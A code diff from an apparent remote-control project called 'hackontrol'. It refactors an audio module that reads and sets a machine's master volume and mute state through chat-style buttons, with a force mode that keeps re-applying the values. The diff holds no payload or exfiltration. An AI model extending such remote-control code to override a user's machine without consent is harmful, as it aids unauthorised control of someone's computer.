@@ -3,7 +3,6 @@ package com.khopan.hackontrol.module;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
-import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
@@ -11,6 +10,7 @@ import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.ModalContext;
 import com.khopan.hackontrol.manager.interaction.Question;
 import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
+import com.khopan.hackontrol.nativelibrary.User;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
@@ -70,17 +70,17 @@ public class AudioModule extends Module {
 			return;
 		}
 
-		if(NativeLibrary.volume() != this.volume) {
-			NativeLibrary.volume(this.volume);
+		if(User.getMasterVolume() != this.volume) {
+			User.setMasterVolume(this.volume);
 		}
 
-		if(NativeLibrary.mute() != this.mute) {
-			NativeLibrary.mute(this.mute);
+		if(User.isMute() != this.mute) {
+			User.setMute(this.mute);
 		}
 	}
 
 	private void buttonMute(ButtonContext context, boolean mute) {
-		if((this.forceMode ? this.mute : NativeLibrary.mute()) == mute) {
+		if((this.forceMode ? this.mute : User.isMute()) == mute) {
 			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
 			return;
 		}
@@ -90,7 +90,7 @@ public class AudioModule extends Module {
 				if(this.forceMode) {
 					this.mute = false;
 				} else {
-					NativeLibrary.mute(false);
+					User.setMute(false);
 				}
 			});
 
@@ -100,14 +100,14 @@ public class AudioModule extends Module {
 		if(this.forceMode) {
 			this.mute = true;
 		} else {
-			NativeLibrary.mute(true);
+			User.setMute(true);
 		}
 
 		context.deferEdit().queue();
 	}
 
 	private void buttonChangeVolume(ButtonContext context) {
-		float volume = this.forceMode ? this.volume : NativeLibrary.volume();
+		float volume = this.forceMode ? this.volume : User.getMasterVolume();
 		String volumeLevel = Integer.toString(Math.min(Math.max((int) Math.round(((double) volume) * 100.0d), 0), 100));
 		TextInput textInput = TextInput.create("volume", "Volume", TextInputStyle.SHORT)
 				.setRequired(true)
@@ -135,8 +135,8 @@ public class AudioModule extends Module {
 			return;
 		}
 
-		this.volume = NativeLibrary.volume();
-		this.mute = NativeLibrary.mute();
+		this.volume = User.getMasterVolume();
+		this.mute = User.isMute();
 		this.forceMode = true;
 		context.deferEdit().queue();
 	}
@@ -169,7 +169,7 @@ public class AudioModule extends Module {
 		if(this.forceMode) {
 			this.volume = volume;
 		} else {
-			NativeLibrary.volume(volume);
+			User.setMasterVolume(volume);
 		}
 
 		context.deferEdit().queue();
